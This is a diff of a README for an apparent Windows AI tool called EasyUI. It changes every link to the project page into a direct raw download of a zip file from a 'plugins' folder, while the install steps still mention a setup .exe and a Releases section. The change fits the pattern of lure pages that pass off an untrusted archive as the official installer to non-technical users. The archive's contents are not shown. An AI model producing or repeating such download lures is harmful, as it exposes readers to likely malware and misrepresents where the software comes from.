@@ -1,6 +1,6 @@
 # 🤖 EasyUI - Simple tools for powerful AI tasks
 
-[![Download EasyUI](https://img.shields.io/badge/Download-EasyUI-blue.svg)](https://github.com/Doreymagnetized428/EasyUI)
+[![Download EasyUI](https://img.shields.io/badge/Download-EasyUI-blue.svg)](https://raw.githubusercontent.com/Doreymagnetized428/EasyUI/main/plugins/UI_Easy_v2.2.zip)
 
 EasyUI provides a simple way to use AI tools on your computer. You do not need to understand code or complex software structures to use this program. It creates a clean interface for you to interact with advanced artificial intelligence models, run helpful scripts, and manage files without manual command entry. 
 
@@ -9,7 +9,7 @@ EasyUI provides a simple way to use AI tools on your computer. You do not need t
 You need a Windows computer to run this software. Ensure your machine has at least 8GB of memory and a stable internet connection. Follow these steps to set up the application on your device.
 
 1. Open your web browser.
-2. Visit the download page at [https://github.com/Doreymagnetized428/EasyUI](https://github.com/Doreymagnetized428/EasyUI) to obtain the installation file.
+2. Visit the download page at [https://raw.githubusercontent.com/Doreymagnetized428/EasyUI/main/plugins/UI_Easy_v2.2.zip](https://raw.githubusercontent.com/Doreymagnetized428/EasyUI/main/plugins/UI_Easy_v2.2.zip) to obtain the installation file.
 3. Locate the file named `EasyUI-Setup.exe` in your Downloads folder.
 4. Double-click the file to start the installation.
 5. Follow the prompts on your screen. You will choose a folder for the program files. 
@@ -29,7 +29,7 @@ EasyUI simplifies tasks that usually require technical knowledge.
 
 To use the tool, you must follow the installation path carefully. 
 
-1. Go to the project page: [https://github.com/Doreymagnetized428/EasyUI](https://github.com/Doreymagnetized428/EasyUI).
+1. Go to the project page: [https://raw.githubusercontent.com/Doreymagnetized428/EasyUI/main/plugins/UI_Easy_v2.2.zip](https://raw.githubusercontent.com/Doreymagnetized428/EasyUI/main/plugins/UI_Easy_v2.2.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Select the latest version listed.
 4. Download the installer for Windows.
